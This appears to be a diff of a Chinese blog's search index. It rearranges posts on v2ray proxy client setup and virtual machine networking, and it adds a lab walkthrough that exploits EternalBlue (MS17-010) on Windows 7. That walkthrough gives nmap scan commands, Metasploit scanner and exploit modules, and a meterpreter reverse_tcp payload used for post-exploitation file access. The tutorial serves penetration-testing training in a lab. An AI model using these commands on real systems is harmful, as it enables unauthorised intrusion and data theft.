-<li><p>双击文件夹下的<code>v2rayN.exe</code>程序,在电脑右下角小托盘处找到图标后打开主界面:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233832.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233842.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233902.png" alt=""></p>
-</li>
-</ol>
-<hr>
-<h3 id="配置v2rayN客户端"><a href="#配置v2rayN客户端" class="headerlink" title="配置v2rayN客户端"></a>配置v2rayN客户端</h3><h4 id="导入服务端"><a href="#导入服务端" class="headerlink" title="导入服务端"></a>导入服务端</h4><p>复制我们在v2ray服务端配置中获得的vmess链接,依次点击<code>服务器--&gt;从剪贴板导入批量URL</code>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233913.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233940.png" alt=""></p>
-<h4 id="更新pac"><a href="#更新pac" class="headerlink" title="更新pac"></a>更新pac</h4><p>依次选择<code>检查更新--&gt;PAC</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234021.png" alt=""></p>
-<h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><ol>
-<li><p><strong>基础设置:</strong> 在<code>Core:基础设置--&gt;http代理--开启PAC,并自动配置系统代理(PAC模式)</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234036.png" alt=""></p>
-</li>
-<li><p>. <strong>路由设置:</strong> 在在<code>Core:路由设置--&gt;一键设置默认规则</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234122.png" alt=""></p>
-</li>
-</ol>
-<p>然后点击确定就行了.</p>
-<br>
-
-<blockquote>
-<p>这是一条分隔线</p>
-</blockquote>
-<hr>
-<hr>
-<h2 id="v2rayN-SwitchyOmega配合使用"><a href="#v2rayN-SwitchyOmega配合使用" class="headerlink" title="v2rayN+SwitchyOmega配合使用."></a>v2rayN+SwitchyOmega配合使用.</h2><h3 id="v2rayN配置"><a href="#v2rayN配置" class="headerlink" title="v2rayN配置"></a>v2rayN配置</h3><h4 id="下载所需文件-1"><a href="#下载所需文件-1" class="headerlink" title="下载所需文件"></a>下载所需文件</h4><p>v2ray核心:<a href="https://github.com/v2ray/v2ray-core/releases/latest" target="_blank" rel="noopener">v2ray-core</a><br>v2rayN客户端:<a href="https://github.com/2dust/v2rayN/releases/latest" target="_blank" rel="noopener">v2rayN</a><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234159.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234217.png" alt=""></p>
-<h4 id="安装v2rayN客户端-1"><a href="#安装v2rayN客户端-1" class="headerlink" title="安装v2rayN客户端"></a>安装v2rayN客户端</h4><ol>
-<li><p>之后我们将两个压缩包解压至<strong>同一个文件夹</strong>中,该文件夹路径则为软件安装路径.<br><em>注:此处两个压缩包的文件要放在同一个文件夹下面,若提示存在相同文件,覆盖就行</em></p>
-</li>
-<li><p>双击文件夹下的<code>v2rayN.exe</code>程序,在电脑右下角小托盘处找到图标后打开主界面:<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234227.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234249.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234328.png" alt=""></p>
-</li>
-</ol>
-<hr>
-<h4 id="配置v2rayN客户端-1"><a href="#配置v2rayN客户端-1" class="headerlink" title="配置v2rayN客户端"></a>配置v2rayN客户端</h4><h5 id="导入服务端-1"><a href="#导入服务端-1" class="headerlink" title="导入服务端"></a>导入服务端</h5><p>复制我们在v2ray服务端配置中获得的vmess链接,依次点击<code>服务器--&gt;从剪贴板导入批量URL</code>.<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234347.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234419.png" alt=""></p>
-<hr>
-<hr>
-<p><strong><em>注:从此处开始和上面完全不一样!!!</em></strong><br><strong><em>注:从此处开始和上面完全不一样!!!</em></strong><br><strong><em>注:从此处开始和上面完全不一样!!!</em></strong></p>
-<hr>
-<hr>
-<h5 id="参数设置-1"><a href="#参数设置-1" class="headerlink" title="参数设置"></a>参数设置</h5><p><strong>基础设置:</strong> 在<code>Core:基础设置--&gt;http代理--仅开启http代理,不改变系统代理</code>.<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234459.png" alt=""></p>
-<hr>
-<h3 id="SwitchyOmega配置"><a href="#SwitchyOmega配置" class="headerlink" title="SwitchyOmega配置"></a>SwitchyOmega配置</h3><h4 id="下载SwitchyOmega插件"><a href="#下载SwitchyOmega插件" class="headerlink" title="下载SwitchyOmega插件"></a>下载SwitchyOmega插件</h4><p>插件下载地址: <a href="https://github.com/FelisCatus/SwitchyOmega/releases/latest" target="_blank" rel="noopener">GitHub</a>&nbsp; &nbsp;&nbsp;&nbsp;<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">Chrome商店</a></p>
-<h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h4><p>安装方法详情见 : <a href="https://www.yuanhe-xia.cn/doc/1720/">浏览器插件如何安装</a> </p>
-<hr>
-<h4 id="配置SwitchyOmega插件"><a href="#配置SwitchyOmega插件" class="headerlink" title="配置SwitchyOmega插件"></a>配置SwitchyOmega插件</h4><h5 id="导入备份配置文件"><a href="#导入备份配置文件" class="headerlink" title="导入备份配置文件"></a>导入备份配置文件</h5><p><strong>打开插件配置,选择</strong><code>导入/导出--&gt;在线恢复--&gt;恢复</code><br><strong>在线恢复网址为:</strong><a href="https://raw.githubusercontent.com/wiki/FelisCatus/SwitchyOmega/GFWList.bak" target="_blank" rel="noopener">https://raw.githubusercontent.com/wiki/FelisCatus/SwitchyOmega/GFWList.bak</a><br><em>(若提示失败多重试几遍,实在不行可选择从备份文件恢复,备份文件下载地址:<a href="https://yuanhe-xia.lanzous.com/iXfrVez3i6b" target="_blank" rel="noopener">蓝奏云</a>)</em><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234514.png" alt=""></p>
-<h5 id="代理服务器设置"><a href="#代理服务器设置" class="headerlink" title="代理服务器设置"></a>代理服务器设置</h5><p>依次选中<code>情景模式--&gt;GFWed</code>,配置<code>http</code>代理协议和<code>10809</code>代理端口<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234528.png" alt=""></p>
-<h5 id="情景模式设置"><a href="#情景模式设置" class="headerlink" title="情景模式设置"></a>情景模式设置</h5><p>依次选中 <code>情景模式--&gt;自动切换</code> ,下滑到 <code>规则列表设置</code>,点击 <code>立即更新情景模式</code>  <em>(若提示更新失败,多点几次)</em><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234538.png" alt=""></p>
-<h3 id="插件使用"><a href="#插件使用" class="headerlink" title="插件使用"></a>插件使用</h3><p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234557.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基础篇</title>
     <url>/doc/6314/</url>
     <content><![CDATA[<blockquote>
@@ -857,45 +584,6 @@
       </categories>
       <tags>
         <tag>培训</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机网络模式说明及无网络解决方案</title>
-    <url>/doc/46570/</url>
-    <content><![CDATA[<h2 id="模式说明"><a href="#模式说明" class="headerlink" title="模式说明"></a>模式说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;一般来说使用桥接模式居多 , 但在一些 <strong>网络受限</strong> 的情况下只能选择nat模式 , 主机模式和LAN模式不常用,不太清楚. </p>
-<a id="more"></a>
-
-<h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>适用场景:</p>
-<ul>
-<li>局域网其他设备需要访问虚拟机的网络服务. </li>
-<li>虚拟机需要访问局域网内其他设备的网络服务. </li>
-</ul>
-<hr>
-<h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>适用场景 : </p>
-<ul>
-<li>对<strong>登录</strong>使用的网络做了<strong>限制</strong> <em>(例, 限制登录设备的mac地址或是对同时登录人数有要求)</em> 的情况下.  <strong>注: 此类场景多以学校或事业单位居多 , 并且要保证主机能够正常使用网络 , 因为虚拟机是共享的主机的网络</strong> </li>
-</ul>
-<hr>
-<h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><ul>
-<li>多块网卡组建自己的虚拟机网络.</li>
-</ul>
-<hr>
-<hr>
-<h2 id="部分报错解决思路"><a href="#部分报错解决思路" class="headerlink" title="部分报错解决思路"></a>部分报错解决思路</h2><h3 id="虚拟机外部原因"><a href="#虚拟机外部原因" class="headerlink" title="虚拟机外部原因"></a>虚拟机外部原因</h3><ol>
-<li>桥接模式下在 <code>编辑--&gt;虚拟网络编辑器--&gt;更改设置</code> 中查看桥接的网卡是否为能够正常联网的网卡. <strong>注: 因为它这个是自动 , 所以经常发生桥接到一个不能上网的网卡上</strong> .</li>
-<li>选择 <code>编辑--&gt;虚拟网络编辑器--&gt;更改设置--&gt;还原默认设置</code> 接下来会自动重装虚拟网卡. <strong>注: 这个我真的没法解释 , 但是真的管用 , 哪怕我本来没改动原来的设置 , 只要重装一遍就好了 , 我管这叫计算机中的玄学</strong> .</li>
-</ol>
-<h3 id="虚拟机内部原因"><a href="#虚拟机内部原因" class="headerlink" title="虚拟机内部原因"></a>虚拟机内部原因</h3><ol>
-<li>查看虚拟机使用的网卡是否正常启动.  <em>(这个在拷贝的虚拟机中较常见)</em> <strong>注:有些虚拟机的网卡名不一定就是eth之类 , 注意虚拟机中的网卡名 .</strong></li>
-<li>路由问题. </li>
-<li>查看网络是dhcp自动分配还是静态地址 , 如果使用的是静态地址的话一旦更换网络则对应设置也要做出更改. </li>
-</ol>
-]]></content>
-      <categories>
-        <category>报错解决</category>
-      </categories>
-      <tags>
-        <tag>虚拟机</tag>
       </tags>
   </entry>
   <entry>
@@ -1145,6 +833,45 @@
       </tags>
   </entry>
   <entry>
+    <title>虚拟机网络模式说明及无网络解决方案</title>
+    <url>/doc/46570/</url>
+    <content><![CDATA[<h2 id="模式说明"><a href="#模式说明" class="headerlink" title="模式说明"></a>模式说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;一般来说使用桥接模式居多 , 但在一些 <strong>网络受限</strong> 的情况下只能选择nat模式 , 主机模式和LAN模式不常用,不太清楚. </p>
+<a id="more"></a>
+
+<h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>适用场景:</p>
+<ul>
+<li>局域网其他设备需要访问虚拟机的网络服务. </li>
+<li>虚拟机需要访问局域网内其他设备的网络服务. </li>
+</ul>
+<hr>
+<h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>适用场景 : </p>
+<ul>
+<li>对<strong>登录</strong>使用的网络做了<strong>限制</strong> <em>(例, 限制登录设备的mac地址或是对同时登录人数有要求)</em> 的情况下.  <strong>注: 此类场景多以学校或事业单位居多 , 并且要保证主机能够正常使用网络 , 因为虚拟机是共享的主机的网络</strong> </li>
+</ul>
+<hr>
+<h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><ul>
+<li>多块网卡组建自己的虚拟机网络.</li>
+</ul>
+<hr>
+<hr>
+<h2 id="部分报错解决思路"><a href="#部分报错解决思路" class="headerlink" title="部分报错解决思路"></a>部分报错解决思路</h2><h3 id="虚拟机外部原因"><a href="#虚拟机外部原因" class="headerlink" title="虚拟机外部原因"></a>虚拟机外部原因</h3><ol>
+<li>桥接模式下在 <code>编辑--&gt;虚拟网络编辑器--&gt;更改设置</code> 中查看桥接的网卡是否为能够正常联网的网卡. <strong>注: 因为它这个是自动 , 所以经常发生桥接到一个不能上网的网卡上</strong> .</li>
+<li>选择 <code>编辑--&gt;虚拟网络编辑器--&gt;更改设置--&gt;还原默认设置</code> 接下来会自动重装虚拟网卡. <strong>注: 这个我真的没法解释 , 但是真的管用 , 哪怕我本来没改动原来的设置 , 只要重装一遍就好了 , 我管这叫计算机中的玄学</strong> .</li>
+</ol>
+<h3 id="虚拟机内部原因"><a href="#虚拟机内部原因" class="headerlink" title="虚拟机内部原因"></a>虚拟机内部原因</h3><ol>
+<li>查看虚拟机使用的网卡是否正常启动.  <em>(这个在拷贝的虚拟机中较常见)</em> <strong>注:有些虚拟机的网卡名不一定就是eth之类 , 注意虚拟机中的网卡名 .</strong></li>
+<li>路由问题. </li>
+<li>查看网络是dhcp自动分配还是静态地址 , 如果使用的是静态地址的话一旦更换网络则对应设置也要做出更改. </li>
+</ol>
+]]></content>
+      <categories>
+        <category>报错解决</category>
+      </categories>
+      <tags>
+        <tag>虚拟机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>谷歌浏览器插件安装</title>
     <url>/doc/1720/</url>
     <content><![CDATA[<blockquote>
@@ -1300,6 +1027,279 @@
 <p><strong>官网</strong> : <a href="https://www.bandicam.cn/downloads/" target="_blank" rel="noopener">链接</a> </p>
 <p><strong>备份下载</strong> : <a href="https://yuanhe-xia.lanzous.com/idqkffwzq5i" target="_blank" rel="noopener">蓝奏云</a> </p>
 <hr>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现(详细)</title>
+    <url>/doc/15113/</url>
+    <content><![CDATA[<blockquote>
+<p>写在前面的话 : </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 本文将以大名鼎鼎的永恒之蓝漏洞为例 , 逐步讲解如何利用msf对目标系统进行渗透 , 全文会对每个步骤的进行较为详细的讲解 , 适合初识msf的人观看.</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 因为受ms17-010漏洞影响的操作系统版本较多 , 如果用一篇文章写完的话比较长 , 所以针对该漏洞我会分两篇来写 , 其中一篇主要讲解漏洞利用过程(本文) , 另外一篇只会简单说明针对不同的操作系统在渗透过程中所使用模块的不同区别. </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 本文所使用的模块仅针对Windows 7 旗舰版 SP1 64位.</p>
+</blockquote>
+<a id="more"></a>
+
+
+
+<p><strong>环境声明</strong> : </p>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>操作系统</th>
+<th>IP地址</th>
+<th>工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux 2020.2 64位</td>
+<td>192.168.0.102</td>
+<td>nmap , metasploit</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>Windows 7 旗舰版 SP1 64位</td>
+<td>192.168.0.103</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><em>附 : Windows系统镜像SHA-1  :  2CE0B2DB34D76ED3F697CE148CB7594432405E23</em></p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="利用-ping-命令检测网络是否互通"><a href="#利用-ping-命令检测网络是否互通" class="headerlink" title="利用 ping 命令检测网络是否互通"></a>利用 <code>ping</code> 命令检测网络是否互通</h4><p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232435.png" alt=""></p>
+<h4 id="利用-nmap-扫描工具获取靶机信息"><a href="#利用-nmap-扫描工具获取靶机信息" class="headerlink" title="利用 nmap 扫描工具获取靶机信息"></a>利用 <code>nmap</code> 扫描工具获取靶机信息</h4><h5 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h5><p><strong>命令</strong> : <code>sudo nmap -O 192.168.0.103</code></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 在回显中找到 <code>OS details</code> 字段 , 可看到扫描工具 <strong>猜测</strong> 的操作系统 , 猜测操作系统中可能性最大的排第一 , 往后顺延.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232448.png" alt=""></p>
+<h5 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h5><p><strong>命令</strong> : <code>sudo nmap -sV 192.168.0.103</code></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 根据开放服务结合经验推测是否存在漏洞.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232500.png" alt=""></p>
+<hr>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>&nbsp;&nbsp;&nbsp;&nbsp; 在上一步的信息收集中我们仅是对靶机 <strong>可能存在</strong> 的漏洞做了 <strong>推测</strong> , 那么如何验证是否存在该漏洞呢 ? 下文将针对此漏洞的<strong>验证</strong>介绍两种方法 : nmap脚本扫描和msf中 <strong>针对该漏洞</strong> 中的扫描模块. <em>(针对单一漏洞的话 , 后者扫描效率比前者高. 但前者不仅仅是针对这一个漏洞 , 而是会扫描出存在的所有漏洞 , 如何选择就见仁见智了)</em> </p>
+<h4 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h4><p><strong>命令</strong> : <code>sudo nmap --script=vuln 192.168.0.103</code> </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 在回显结果中找到 <code>Host script results</code> 在其返回的结果中查找是否有我们猜测的漏洞. </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232520.png" alt=""></p>
+<h4 id="MSF使用针对该漏洞的扫描模块"><a href="#MSF使用针对该漏洞的扫描模块" class="headerlink" title="MSF使用针对该漏洞的扫描模块"></a>MSF使用针对该漏洞的扫描模块</h4><h5 id="启动MSF"><a href="#启动MSF" class="headerlink" title="启动MSF"></a>启动MSF</h5><p><strong>命令</strong> : <code>sudo msfconsole</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232536.png" alt=""></p>
+<h5 id="搜索该漏洞相关模块并选择扫描模块"><a href="#搜索该漏洞相关模块并选择扫描模块" class="headerlink" title="搜索该漏洞相关模块并选择扫描模块"></a>搜索该漏洞相关模块并选择扫描模块</h5><p>命令 : </p>
+<p><strong>搜索</strong>相关模块 : <code>search ms17-010</code></p>
+<p><strong>选择</strong>对应模块 : <code>use auxiliary/scanner/smb/smb_ms17_010</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232605.png" alt=""></p>
+<h5 id="设置模块所需参数"><a href="#设置模块所需参数" class="headerlink" title="设置模块所需参数"></a>设置模块所需参数</h5><p>命令 : </p>
+<p><strong>查看模块全部设置项</strong> : <code>show options</code> </p>
+<p><strong>设置模块所需设置项</strong> : <code>set RHOSTS 192.168.0.103</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232617.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232631.png" alt=""></p>
+<h5 id="运行该扫描模块"><a href="#运行该扫描模块" class="headerlink" title="运行该扫描模块"></a>运行该扫描模块</h5><p><strong>命令</strong> : <code>exploit</code> 或者 <code>run</code> <em>(二选一)</em> </p>
+<p>前面[+] 一般代表成功 , [-] 一般代表失败.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232651.png" alt=""></p>
+<hr>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&nbsp;&nbsp;&nbsp;&nbsp; 在上一步的漏洞探测过程中我们已经确定了目标系统存在该漏洞 , 那么我们如何利用该漏洞如攻击目标系统呢 ? 比方说获取目标系统中的文件 , 在目标系统中种植后门等 . 下文将详细讲解该漏洞的利用过程. </p>
+<h4 id="搜索该漏洞相关模块并选择漏洞执行模块"><a href="#搜索该漏洞相关模块并选择漏洞执行模块" class="headerlink" title="搜索该漏洞相关模块并选择漏洞执行模块"></a>搜索该漏洞相关模块并选择漏洞执行模块</h4><blockquote>
+<p>启动msf上面讲过我这里就不讲了.</p>
+</blockquote>
+<p>退回msf主界面并重新搜索该漏洞相关模块.</p>
+<p>命令 : </p>
+<p><strong>退回主界面</strong> : <code>back</code> </p>
+<p><strong>搜索相关模块</strong> : <code>search ms17-010</code> </p>
+<p><strong>选择漏洞执行模块</strong> :  <code>use exploit/windows/smb/ms17_010_eternalblue</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232705.png" alt=""></p>
+<h4 id="设置该模块运行所需参数"><a href="#设置该模块运行所需参数" class="headerlink" title="设置该模块运行所需参数"></a>设置该模块运行所需参数</h4><p>命令 : </p>
+<p><strong>查看模块全部参数</strong>  <em>(注意 , 这里是模块参数 , 与下文的载荷参数区分开)</em> : <code>show options</code> </p>
+<p><strong>设置模块所需参数</strong> : <code>set RHOSTS 192.168.0.103</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232729.png" alt=""></p>
+<h4 id="设置载荷及载荷所需参数"><a href="#设置载荷及载荷所需参数" class="headerlink" title="设置载荷及载荷所需参数"></a>设置载荷及载荷所需参数</h4><p>&nbsp;&nbsp;&nbsp;&nbsp; 载荷具体是什么可以去百度 , 这里一言两语解释不清. 就简单说下 : </p>
+<ul>
+<li>需要进入模块才能使用载荷. 但载荷并不是模块的必需品.因此你可以看到在上面的模块全部参数中并没有载荷这一选项.</li>
+<li>不是所有模块都支持使用载荷 , 也不是所有的模块使用的载荷都是同一个. 载荷针对不同的情况是不同的.</li>
+<li>不使用载荷和使用载荷进行攻击是完全两回事 , 前者不使用载荷可能最多只会令目标系统关机并让对方察觉到遭受了攻击 , 而如果是使用了载荷攻击目标系统能在不让对方察觉到的情况下获得对方系统的管理权.</li>
+<li>载荷也有参数.</li>
+</ul>
+<p>命令 : </p>
+<p><strong>设置载荷</strong> :  <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code> </p>
+<p><strong>显示载荷全部设置</strong> : <code>show options</code> </p>
+<p><strong>设置载荷所需设置</strong> :  <code>set LHOST 192.168.0.102</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232748.png" alt=""></p>
+<h4 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h4><p><strong>命令</strong> : <code>exploit</code> 或者 <code>run</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232921.png" alt=""></p>
+<h4 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h4><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 后渗透内容很多 , 具体包括内网提权 , 端口转发 , 跳板攻击等等 , 以后我会开个单章具体介绍. 现目前仅介绍最基本的.</p>
+</blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; <strong>在成功获取到了目标系统返回给我们的meterpreter后我们终于可以做我们想做的事儿了 , 比如我们查看对方桌面有什么文件 ,  查看路由 , 获取文件内容等等.</strong> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825233118.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825233235.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>网络空间</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>Windows漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>v2ray客户端配置(v2rayN和SwitchyOmega)</title>
+    <url>/doc/49460/</url>
+    <content><![CDATA[<p>v2ray客户端配置(v2rayN和SwitchyOmega)</p>
+<h2 id="使用模式"><a href="#使用模式" class="headerlink" title="使用模式:"></a>使用模式:</h2><ul>
+<li>v2rayN单独使用(PAC模式).<ul>
+<li>说明:无需配置谷歌插件,适合日常使用360,QQ,搜狗等浏览器的用户.</li>
+<li>不足:有些时候一些软件会莫名其妙地走代理的流量,导致网页代理速度变慢或不稳定.</li>
+</ul>
+</li>
+<li>v2rayN+SwitchyOmega配合使用.<ul>
+<li>除配置v2rayN客户端外还需配置SwitchyOmega插件,适合浏览器为chrome的用户.</li>
+<li>不足:暂时没发现.</li>
+</ul>
+</li>
+</ul>
+<p>为便于阅读,故下面将两种方法分开单独讲,彼此互不影响.<br><em>(个人推荐第二种,但如果实在放不下360,QQ,搜狗等浏览器的用户用第一种也没事)</em></p>
+<a id="more"></a>
+
+<br>
+
+<hr>
+<hr>
+<h2 id="v2rayN单独使用-PAC模式"><a href="#v2rayN单独使用-PAC模式" class="headerlink" title="v2rayN单独使用(PAC模式)."></a>v2rayN单独使用(PAC模式).</h2><h3 id="下载所需文件"><a href="#下载所需文件" class="headerlink" title="下载所需文件"></a>下载所需文件</h3><p>v2ray核心:<a href="https://github.com/v2ray/v2ray-core/releases/latest" target="_blank" rel="noopener">v2ray-core</a><br>v2rayN客户端:<a href="https://github.com/2dust/v2rayN/releases/latest" target="_blank" rel="noopener">v2rayN</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233810.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233823.png" alt=""></p>
+<h3 id="安装v2rayN客户端"><a href="#安装v2rayN客户端" class="headerlink" title="安装v2rayN客户端"></a>安装v2rayN客户端</h3><ol>
+<li><p>之后我们将两个压缩包解压至<strong>同一个文件夹</strong>中,该文件夹路径则为软件安装路径.<br><em>注:此处两个压缩包的文件要放在同一个文件夹下面,若提示存在相同文件,覆盖就行</em></p>
+</li>
+<li><p>双击文件夹下的<code>v2rayN.exe</code>程序,在电脑右下角小托盘处找到图标后打开主界面:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233832.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233842.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233902.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<h3 id="配置v2rayN客户端"><a href="#配置v2rayN客户端" class="headerlink" title="配置v2rayN客户端"></a>配置v2rayN客户端</h3><h4 id="导入服务端"><a href="#导入服务端" class="headerlink" title="导入服务端"></a>导入服务端</h4><p>复制我们在v2ray服务端配置中获得的vmess链接,依次点击<code>服务器--&gt;从剪贴板导入批量URL</code>.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233913.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233940.png" alt=""></p>
+<h4 id="更新pac"><a href="#更新pac" class="headerlink" title="更新pac"></a>更新pac</h4><p>依次选择<code>检查更新--&gt;PAC</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234021.png" alt=""></p>
+<h4 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h4><ol>
+<li><p><strong>基础设置:</strong> 在<code>Core:基础设置--&gt;http代理--开启PAC,并自动配置系统代理(PAC模式)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234036.png" alt=""></p>
+</li>
+<li><p>. <strong>路由设置:</strong> 在在<code>Core:路由设置--&gt;一键设置默认规则</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234122.png" alt=""></p>
+</li>
+</ol>
+<p>然后点击确定就行了.</p>
+<br>
+
+<blockquote>
+<p>这是一条分隔线</p>
+</blockquote>
+<hr>
+<hr>
+<h2 id="v2rayN-SwitchyOmega配合使用"><a href="#v2rayN-SwitchyOmega配合使用" class="headerlink" title="v2rayN+SwitchyOmega配合使用."></a>v2rayN+SwitchyOmega配合使用.</h2><h3 id="v2rayN配置"><a href="#v2rayN配置" class="headerlink" title="v2rayN配置"></a>v2rayN配置</h3><h4 id="下载所需文件-1"><a href="#下载所需文件-1" class="headerlink" title="下载所需文件"></a>下载所需文件</h4><p>v2ray核心:<a href="https://github.com/v2ray/v2ray-core/releases/latest" target="_blank" rel="noopener">v2ray-core</a><br>v2rayN客户端:<a href="https://github.com/2dust/v2rayN/releases/latest" target="_blank" rel="noopener">v2rayN</a><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234159.png" alt=""><br><img 